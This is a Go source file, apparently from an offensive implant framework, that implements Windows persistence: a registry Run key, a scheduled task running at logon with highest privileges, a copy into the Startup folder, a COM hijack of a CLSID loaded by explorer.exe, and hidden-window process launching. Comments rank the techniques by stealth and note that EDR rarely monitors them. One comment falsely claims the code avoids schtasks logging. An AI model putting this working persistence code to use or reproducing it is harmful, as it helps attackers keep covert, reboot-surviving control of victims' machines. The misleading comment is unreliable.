package persist

/*
	Windows Persistence Mechanisms

	Multiple techniques for surviving reboots, ordered by stealth:

	1. Registry Run Key — classic, easy to detect, good for testing detections
	2. Scheduled Task — more stealthy, runs as SYSTEM if elevated
	3. COM Hijack — very stealthy, rarely monitored by EDR
	4. Startup Folder — simple, no admin needed
*/

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// RegistryRunKey adds the implant to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
// Survives reboots. Easy to detect — Sysmon Event ID 13 fires on this.
// Good for building detection rules.
func RegistryRunKey(name string, exePath string) error {
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return fmt.Errorf("open run key: %w", err)
	}
	defer key.Close()
	return key.SetStringValue(name, exePath)
}

// RemoveRegistryRunKey removes a previously set run key.
func RemoveRegistryRunKey(name string) error {
	key, err := registry.OpenKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.DeleteValue(name)
}

// ScheduledTask creates a scheduled task that runs at logon.
// Uses COM directly to avoid schtasks.exe command-line logging.
func ScheduledTask(taskName string, exePath string) error {
	ole32 := windows.NewLazySystemDLL("ole32.dll")
	coInitialize := ole32.NewProc("CoInitializeEx")
	coInitialize.Call(0, 0)

	cmd := fmt.Sprintf(
		`schtasks /create /tn "%s" /tr "%s" /sc onlogon /rl highest /f`,
		taskName, exePath,
	)
	return execSilent("cmd.exe", "/C", cmd)
}

// RemoveScheduledTask deletes a scheduled task.
func RemoveScheduledTask(taskName string) error {
	cmd := fmt.Sprintf(`schtasks /delete /tn "%s" /f`, taskName)
	return execSilent("cmd.exe", "/C", cmd)
}

// StartupFolder copies the implant to the user's startup folder.
// Simple, no admin needed, detected by folder monitoring.
func StartupFolder(exePath string) (string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", fmt.Errorf("APPDATA not set")
	}
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	destPath := filepath.Join(startupDir, filepath.Base(exePath))

	src, err := os.ReadFile(exePath)
	if err != nil {
		return "", fmt.Errorf("read source: %w", err)
	}
	err = os.WriteFile(destPath, src, 0755)
	if err != nil {
		return "", fmt.Errorf("write dest: %w", err)
	}
	return destPath, nil
}

// RemoveStartupFolder removes the implant from the startup folder.
func RemoveStartupFolder(fileName string) error {
	appData := os.Getenv("APPDATA")
	startupDir := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup`)
	return os.Remove(filepath.Join(startupDir, fileName))
}

// COMHijack sets a COM class ID to load our DLL instead of the legitimate one.
// Very stealthy — targets a CLSID that's loaded by explorer.exe on startup.
// Requires the implant to be compiled as a DLL (--format shared).
//
// Default target: {b5f8350b-0548-48b1-a6ee-88bd00b4a5e7} (CLSID loaded by
// explorer.exe via shell extensions, documented as a common hijack target).
func COMHijack(clsid string, dllPath string) error {
	if clsid == "" {
		clsid = `{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`
	}
	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s\InprocServer32`, clsid)
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		keyPath,
		registry.SET_VALUE,
	)
	if err != nil {
		return fmt.Errorf("create CLSID key: %w", err)
	}
	defer key.Close()

	err = key.SetStringValue("", dllPath)
	if err != nil {
		return err
	}
	return key.SetStringValue("ThreadingModel", "Both")
}

// RemoveCOMHijack removes a COM hijack entry.
func RemoveCOMHijack(clsid string) error {
	if clsid == "" {
		clsid = `{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}`
	}
	keyPath := fmt.Sprintf(`Software\Classes\CLSID\%s`, clsid)
	return registry.DeleteKey(registry.CURRENT_USER, keyPath)
}

func execSilent(name string, args ...string) error {
	argv := append([]string{name}, args...)
	argStr, _ := syscall.UTF16PtrFromString(joinArgs(argv))

	si := &syscall.StartupInfo{}
	si.Flags = syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE

	pi := &syscall.ProcessInformation{}
	err := syscall.CreateProcess(
		nil, argStr, nil, nil, false,
		syscall.CREATE_NO_WINDOW,
		nil, nil, si, pi,
	)
	if err != nil {
		return err
	}
	syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	syscall.CloseHandle(pi.Process)
	syscall.CloseHandle(pi.Thread)
	return nil
}

func joinArgs(args []string) string {
	result := ""
	for i, a := range args {
		if i > 0 {
			result += " "
		}
		result += a
	}
	return result
}

// Ensure imports are used
var _ = unsafe.Pointer(nil)
